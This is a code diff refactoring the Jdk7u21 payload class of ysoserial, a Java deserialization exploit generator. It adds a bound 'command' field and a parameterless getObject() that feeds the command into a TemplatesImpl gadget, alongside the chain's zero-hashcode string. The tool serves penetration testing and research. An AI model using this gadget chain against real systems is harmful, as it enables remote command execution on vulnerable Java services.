@@ -6,6 +6,8 @@ import java.util.LinkedHashSet;
 
 import javax.xml.transform.Templates;
 
+import ysoserial.annotation.Bind;
+import ysoserial.interfaces.ObjectPayload;
 import ysoserial.payloads.annotation.Dependencies;
 import ysoserial.payloads.annotation.PayloadTest;
 import ysoserial.payloads.util.Gadgets;
@@ -55,8 +57,17 @@ LinkedHashSet.readObject()
 @Dependencies()
 @PayloadTest ( precondition = "isApplicableJavaVersion")
 public class Jdk7u21 implements ObjectPayload<Object> {
+	
+	@Bind private String command;
 
+	/**
+	 * @deprecated Use {@link #getObject()} instead
+	 */
 	public Object getObject(final String command) throws Exception {
+		return getObject();
+	}
+
+	public Object getObject() throws Exception {
 		final Object templates = Gadgets.createTemplatesImpl(command);
 
 		String zeroHashCodeStr = "f5a5a608";
